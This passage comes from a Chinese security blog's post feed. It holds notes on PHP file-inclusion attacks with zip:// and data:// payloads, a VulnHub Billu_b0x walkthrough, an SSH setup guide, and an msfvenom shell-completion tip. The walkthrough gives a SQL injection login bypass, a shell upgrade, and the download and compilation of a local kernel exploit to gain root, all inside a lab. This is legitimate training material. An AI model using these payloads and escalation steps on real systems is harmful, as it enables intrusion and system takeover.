punctuation">.</span><span class="token string">".jpg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>当存在这种限制的时候，可以利用zip协议，当然需要有自己上传的zip或者已存在可利用的。<br>zip文件内是写好的webshell并且修改后缀为<code>jpg</code><br>利用zip协议可以直接读到压缩包内的文件信息<br>当然不只是zip格式，只要是zip压缩文件，不论是什么后缀名都可以访问，路径必须是绝对路径，%23是url编码的<code>#</code><br>exp<code>localhost/test.php?file=zip://shell.zip%23shell</code></p><p>phar:// 协议和zip://协议的区别就是phar://支持相对路径,phar://中不使用<code>#</code>，而使用<code>/</code></p><h2 id="data-协议"><a href="#data-协议" class="headerlink" title="data:// 协议"></a>data:// 协议</h2><p>该协议需要<code>allow_url_include</code>为<code>On</code><br>data:// 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致 任意代码执行。</p><pre class=" language-php"><code class="language-php">@<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token operator">==</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input'){</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'you are hack!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>exp</p><pre><code>?file=data://,&lt;?php phpinfo();?file=data://text/plain,&lt;?php phpinfo();?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=?file=data:text/plain,&lt;?php phpinfo();?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</code></pre>]]></content>
      
      
      <categories>
          
          <category> 总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Billu_b0x靶机渗透</title>
      <link href="/2019/07/14/billu-b0x-ba-ji-shen-tou/"/>
      <url>/2019/07/14/billu-b0x-ba-ji-shen-tou/</url>
      
        <content type="html"><![CDATA[<h1 id="Billu-b0x靶机渗透"><a href="#Billu-b0x靶机渗透" class="headerlink" title="Billu_b0x靶机渗透"></a>Billu_b0x靶机渗透</h1><h2 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h2><p><a href="https://download.vulnhub.com/billu/Billu_b0x.zip" target="_blank" rel="noopener">https://download.vulnhub.com/billu/Billu_b0x.zip</a></p><h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>攻击机为<code>kali linux</code> ip 为 <code>192.168.12.145</code><br>靶机 ip <code>192.168.12.165</code></p><h2 id="主机发现和信息搜集"><a href="#主机发现和信息搜集" class="headerlink" title="主机发现和信息搜集"></a>主机发现和信息搜集</h2><p>主机发现</p><pre><code>netdiscover -r 192.168.12.0/24</code></pre><p>发现靶机ip为 <code>192.168.12.165</code></p><p>端口扫描</p><pre><code>nmap -sS -A -Pn -p- -n 192.168.12.165</code></pre><p>发现开放了 22 80端口</p><p>直接用<code>dirb</code>区探测目录</p><pre><code>dirb http://192.168.12.165 /usr/share/wordlists/dirb/big.txt</code></pre><p><img src="https://mail.ding0x0.top/blog/bj/bj_1_1.png" alt="bj_1_1"><br>说下目录利用</p><pre><code>192.168.12.165/index #登录页，说是存在sql注入192.168.12.165/in #phpinfo 可以得到网站绝对路径192.168.12.165/test #任意文件下载192.168.12.165/panel #需要登陆192.168.12.165/c #得到mysql配置文件192.168.12.165/phpmy/ #phpmyadmin</code></pre><p>可以从<code>c</code>中得到<code>mysql</code>配置，登陆phpmyadmin，在<code>phpinfo</code>找到绝对路径，写入一句话，尝试后失败<br>但是得到了登陆张号和密码可以拿去登陆。</p><h2 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h2><p>通过任意文件下载拿到首页源码，构造万能密码登陆。</p><pre class=" language-php"><code class="language-php"><span class="token variable">$uname</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'\''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'un'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$pass</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'\''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'ps'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$run</span><span class="token operator">=</span><span class="token string">'select * from auth where  pass=\''</span><span class="token punctuation">.</span><span class="token variable">$pass</span><span class="token punctuation">.</span><span class="token string">'\' and uname=\''</span><span class="token punctuation">.</span><span class="token variable">$uname</span><span class="token punctuation">.</span><span class="token string">'\''</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//login</span><span class="token punctuation">}</span></code></pre><p>写完后看了很多东西，说是过滤了<code>\&#39;</code>,这东西不是转义符么？实际上的sql语句不应该是这样的么</p><pre class=" language-php"><code class="language-php"><span class="token variable">$run</span> <span class="token operator">=</span> <span class="token string">"select * from auth where pass = '$pass' and uname = '$uname'"</span><span class="token punctuation">;</span></code></pre><p>然后会把所有的<code>&#39;</code>替换成空，那么构造的万能密码应该是这个意思</p><pre class=" language-php"><code class="language-php"><span class="token variable">$run</span> <span class="token operator">=</span> <span class="token string">"select * from auth where pass = '-\' and uname = 'or 1=1-- '"</span><span class="token punctuation">;</span></code></pre><p>我的理解是<strong>用\把pass的第二个单引号给转义，所以pass现在是<code>-\&#39; and uname =</code>这一整串，然后跟上or 1=1</strong>构造成万能密码。<br>顺便提下，在sql命令行里查询想要转义<code>&#39;</code>需要用两个<code>\</code>，也是问了别人，以前都没注意过，也没出现过这种情况。<br>然后需要注意的一点是注释符<code>--</code>和被<strong>注释的</strong>的字符中间要有一个空格，或者直接用<code>#</code>。<br>以上仅是个人理解，如果有误，望斧正</p><p>接着登陆后存在一个文件上传和包含，这里很好审出来就不写了，直接跳到反弹回shell。</p><p>拿到后用python返回一个交互shell</p><pre class=" language-python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">'__import__("pty").spawn("/bin/bash")'</span></code></pre><p>查看版本信息</p><pre class=" language-sh"><code class="language-sh">uname -a#Linux indishell 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linux</code></pre><p>直接在kali中搜索本地提交脚本</p><pre class=" language-sh"><code class="language-sh">searchsploit linux 3.13.0 | grep local</code></pre><p>cp一份到/tmp目录，打开一个服务器</p><pre class=" language-python"><code class="language-python">python <span class="token operator">-</span>m SimpleHTTPServer <span class="token number">8000</span></code></pre><p>在靶机中cd到/tmp目录下载脚本</p><pre class=" language-sh"><code class="language-sh">wget http://192.168.12.145:8000/37292.c</code></pre><p>用gcc编译</p><pre class=" language-sh"><code class="language-sh">gcc 373292.c -o pwn</code></pre><p>直接执行提权成功。</p><h2 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h2><p>在phpmyadmin目录下一般存放这服务器的配置文件，<code>config.inc.php</code>，尝试访问，确实存在，直接下载，得到root账号密码，ssh登陆。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>开始sql注入没能够理解，看了很多篇，试了很多次，都没成功，小细节上就是 <code>--</code>后要有一个空格，其实这种方法在实验吧有一题出现过，后来遇到的少了就没注意过，这是一点，然后是要多关注服务器的配置文件，可能包含很多有用的信息。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux ssh</title>
      <link href="/2019/07/12/ssh/"/>
      <url>/2019/07/12/ssh/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-ssh"><a href="#Linux-ssh" class="headerlink" title="Linux ssh"></a>Linux ssh</h1><h2 id="基本配置"><a href="#基本配置" class="headerlink" title="基本配置"></a>基本配置</h2><p>环境为 Ubuntu16.04</p><pre><code>apt-get install sshopen-server</code></pre><p>Ubuntu默认安装了<code>openssh-client</code>。<br>如果没有开启<code>22</code>端口，可以用iptables开启</p><pre class=" language-sh"><code class="language-sh">iptables -A INPUT -p tcp --dport 22 -j ACCEPTiptables -A OUTPUT -p tcp --sport 22 -j ACCEPT</code></pre><p>开启ssh</p><pre><code>service ssh start</code></pre><h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><pre><code>ssh username@host #输入密码登陆远程主机ssh -i id_rsa username@host #指定你的私钥免密登陆ssh -p 4444 username@host #指定ssh端口</code></pre><p>设置免密登陆</p><ol><li>生成你的密钥对 <code>ssh-keygen</code></li></ol><pre class=" language-shell"><code class="language-shell">root@ding:/etc/ssh# ssh-keygen #生成密钥对Generating public/private rsa key pair.Enter file in which to save the key (/root/.ssh/id_rsa): #指定你的保存路径默认为 /yourhome/.ssh/id_rsaEnter passphrase (empty for no passphrase): #输入私钥密码，以后么此时用都会提示需要密码，回车表示不设置Enter same passphrase again:Your identification has been saved in /root/.ssh/id_rsa.Your public key has been saved in /root/.ssh/id_rsa.pub.The key fingerprint is:SHA256:UNI6mAQaEiJz8jNXEUMQjFbEciHnwojee0nd6q5DDSE root@dingThe key's randomart image is:+---[RSA 2048]----+|O.+BB=B+.        ||=X+E=o +.        ||+.*++oo.         ||. .=o.+..        || . . .ooS.       ||    o....        ||   ..o .         ||    ...          ||     .+o         |+----[SHA256]-----+</code></pre><p>如果目录下存在同名密钥文件，会提示你是否覆盖，覆盖了可能导致密钥丢失</p><ol start="2"><li><p>利用 <code>ssh-copy-id</code>复制你的公钥到远程主机 </p><pre class=" language-shell"><code class="language-shell">ssh-copy-id username@host #需要知道ssh密码，如果换了端口可以用-p指定</code></pre><p>输入密码后即可复制到 用户的<code>.ssh</code>目录下<br>然后利用<code>ssh username@host</code>即可免密登陆</p></li><li><p>可能会出现的问题<br>权限设置不正确，首先要保证<code>authorized_keys</code>权限为<code>600</code>（公钥信息保存在这里），<code>.ssh</code>目录为<code>700</code>，如果出现错误<code>sign_and_send_pubkey: signing failed: agent refused operation</code>，权限设置，修改<code>/etc/ssh/sshd_config</code>的<code>PubkeyAuthentication yes</code>，表示支持公钥登陆，查看<code>AuthorizedKeysFile</code>是否是使用<code>authorized_keys</code>认证文件。如果都没问题，可能是需要制定私钥文件，可以使用ssh代理</p><pre><code>eval &quot;$(ssh-agent -s)&quot;ssh-add</code></pre><p>更多的可以参考<a href="https://www.zsythink.net/archives/2407" target="_blank" rel="noopener">ssh</a>和<a href="https://www.zsythink.net/archives/2407" target="_blank" rel="noopener">ssh代理</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>msfvenom在zsh下payload无法补全解决</title>
      <link href="/2019/07/11/msfvenom-zai-zsh-xia-payload-wu-fa-bu-quan-jie-jue/"/>
      <url>/2019/07/11/msfvenom-zai-zsh-xia-payload-wu-fa-bu-quan-jie-jue/</url>
      
        <content type="html"><![CDATA[<h1 id="msfvenom在zsh下payload无法补全解决"><a href="#msfvenom在zsh下payload无法补全解决" class="headerlink" title="msfvenom在zsh下payload无法补全解决"></a>msfvenom在zsh下payload无法补全解决</h1><h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><p>首先要想<code>msfvenom</code>有代码提示，需要安装<code>zsh</code></p><pre class=" language-sh"><code class="language-sh">sudo apt-get install zsh</code></pre><p>然后安装<code>oh-my-zsh</code></p><pre class=" language-sh"><code class="language-sh">sh -c "$(wget https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)"</code></pre><p>安装脚本</p><pre class=" language-sh"><code class="language-sh">git clone https://github.com/Green-m/msfvenom-zsh-completion ~/.oh-my-zsh/custom/plugins/msfvenom/</code></pre><p>查看是否下载成功</p><pre class=" language-sh"><code class="language-sh">ls ~/.oh-my-zsh/custom/plugins/msfvenom/</code></pre><p>修改配置文件</p><pre class=" language-sh"><code class="language-sh">vi ~/.zshrc #找到plugins=(git),改成plugins=(msfvenom)#下面两条添加到最底下fpath=(~/.zsh/completion$fpath) #（$fpath 通过添加来包含您的目录~/.zshrcautoload-Uzcompinit&&compinit-i #（确保 compinit 已加载或通过添加~/.zshrc）</code></pre><p>保存退出，执行</p><pre class=" language-sh"><code class="language-sh">source ~/.zshrc</code></pre><h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><p>发现其参数都可以智能提示，但是payload没有。看了下源码，找到一种解决方案</p><p>方法就是把<code>payload</code>添加到<code>~/.zsh/venom-cache</code>这个文件中下次再使用就有提示了。</p><p>附上payload列表</p><pre><code></code></pre>]]></content>
      
      
      <categories>
          
          <category> 问题解决 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
